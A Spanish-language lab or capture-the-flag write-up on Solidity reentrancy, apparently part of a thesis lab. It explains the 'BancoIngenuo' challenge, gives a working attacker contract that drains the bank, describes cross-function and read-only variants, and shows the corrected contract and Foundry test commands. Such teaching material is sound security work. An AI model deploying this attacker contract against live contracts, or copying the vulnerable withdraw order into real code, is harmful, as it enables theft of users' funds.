# C2. Reentrada: writeup

Este documento explica cómo resolver el reto del caso C2 y las otras dos variantes que se estudian en el laboratorio. El análisis completo está en la sección 4.2 de la memoria.

## El reto: El Banco Ingenuo

En Polonio el reto se llama `BancoIngenuo`. En el laboratorio, el contrato equivalente es `BancoVulnerable` (`src/C2-reentrada/Vulnerable.sol`).

**Escenario.** El banco guarda 10 ETH de otras personas. Cada cuenta puede depositar y retirar su propio saldo, que el banco anota en `balances`.

**Objetivo.** Vaciar el banco partiendo de un depósito propio de 1 ETH. El reto se da por resuelto cuando `isSolved()` devuelve `true`, es decir, cuando el saldo del banco es 0.

## La vulnerabilidad

```solidity
function withdraw() external {
    uint256 amount = balances[msg.sender];
    require(amount > 0, "sin fondos");

    (bool ok, ) = msg.sender.call{value: amount}("");   // 1. envía el Ether
    require(ok, "transferencia fallida");

    balances[msg.sender] = 0;                             // 2. pone el saldo a cero
}
```

El orden está al revés. Cuando el banco envía Ether a un contrato con `call`, se ejecuta la función `receive` de ese contrato, y desde ella se puede volver a llamar a `withdraw`. En ese momento la línea que pone el saldo a cero todavía no se ha ejecutado, así que el banco cree que el atacante aún tiene 1 ETH y vuelve a pagarle. El ciclo se repite hasta vaciar el banco.

La regla que se incumple es *Checks-Effects-Interactions* (CEI): primero se comprueba, después se actualiza el estado y solo al final se interactúa con otros contratos.

## Resolución paso a paso

1. **Escribir el contrato atacante.** Necesita depositar, retirar y, al recibir Ether, volver a retirar mientras el banco tenga fondos:

   ```solidity
   interface IBanco {
       function deposit() external payable;
       function withdraw() external;
   }

   contract Atacante {
       IBanco public banco;

       constructor(address _banco) {
           banco = IBanco(_banco);
       }

       function atacar() external payable {
           banco.deposit{value: msg.value}();
           banco.withdraw();
       }

       // Se ejecuta cada vez que el banco nos envía Ether.
       receive() external payable {
           if (address(banco).balance >= msg.value) {
               banco.withdraw();
           }
       }
   }
   ```

2. **Desplegarlo** pasando la dirección del banco al constructor.
3. **Lanzar el ataque** llamando a `atacar()` con 1 ETH. Ocurre lo siguiente, todo dentro de la misma transacción:
   - El contrato deposita 1 ETH y llama a `withdraw`.
   - El banco le envía 1 ETH y se ejecuta `receive`, que vuelve a llamar a `withdraw`.
   - El saldo anotado sigue siendo 1 ETH, así que el banco paga otra vez.
   - Tras 11 pagos (los 10 ETH ajenos más el propio) el banco ya no tiene saldo suficiente, `receive` deja de reentrar y la ejecución termina. Solo entonces se pone el saldo a cero.
4. **Verificar.** El banco queda a 0 y el contrato atacante tiene 11 ETH.

**Detalle práctico.** Deposita una cantidad que divida exactamente al saldo del banco (1 ETH para 10 ETH). Con 3 ETH, por ejemplo, el ataque se detendría con 1 ETH aún en el banco y el reto no se daría por resuelto.

## Otras variantes del caso

**Reentrada entre funciones** (`BancoTransferibleVulnerable`). `withdraw` lleva el guard `nonReentrant`, pero `transfer`, que mueve saldo entre cuentas, no lo lleva. Dos contratos cómplices se reparten el trabajo: mientras uno cobra, en su `receive` transfiere al otro el saldo que el banco todavía no ha descontado. En la ronda siguiente el otro cobra ese mismo saldo. El guard de una sola función no sirve si otra función comparte el mismo estado.

**Reentrada de solo lectura** (`PoolVulnerable`). Durante una retirada, el contrato envía el Ether antes de actualizar el total de participaciones (`totalShares`). En ese instante el saldo del pool ya ha bajado pero el total de participaciones no, y la función `view` `pricePerShare()`, que no lleva guard, devuelve un precio incorrecto. Un tercer protocolo que la use como oráculo en ese momento toma una decisión sobre un precio falso. No hay robo directo al pool: la víctima es quien lee el precio.

## Mitigación

La versión corregida (`src/C2-reentrada/Fixed.sol`) aplica CEI y, como defensa en profundidad, el guard de OpenZeppelin:

```solidity
function withdraw() external nonReentrant {
    uint256 amount = balances[msg.sender];
    require(amount > 0, "sin fondos");

    balances[msg.sender] = 0; // EFFECT antes que INTERACTION

    (bool ok, ) = msg.sender.call{value: amount}("");
    require(ok, "transferencia fallida");
}
```

Si el atacante reentra, su saldo ya es 0 y el guard bloquea la llamada. La llamada reentrante revierte, el envío falla y toda la retirada revierte con `transferencia fallida`.

Para las otras variantes:

- **Entre funciones**: CEI en `withdraw` y `nonReentrant` en todas las funciones que comparten estado.
- **Solo lectura**: CEI estricto, para que la función `view` nunca se observe a medias. Si no es posible, exponer un indicador de "operación en curso" que los consumidores comprueben.

## Comprobarlo en el laboratorio

```bash
./forge test --match-contract C2_Reentrada
./forge test --match-contract C2_Reentrada --match-test test_Exploit_Vulnerable -vvvv
```

Con `-vvvv` se ve en la traza cada llamada a `withdraw` anidada dentro de la anterior.

| Variante | Ataque | Mitigación |
|---|---|---|
| Clásica | `test_Exploit_Vulnerable` | `test_Fixed_Resiste` |
| Entre funciones | `test_Exploit_CrossFunction_Vulnerable` | `test_Fixed_CrossFunction_Resiste` |
| Solo lectura | `test_Exploit_ReadOnly_Vulnerable` | `test_Fixed_ReadOnly_Resiste` |
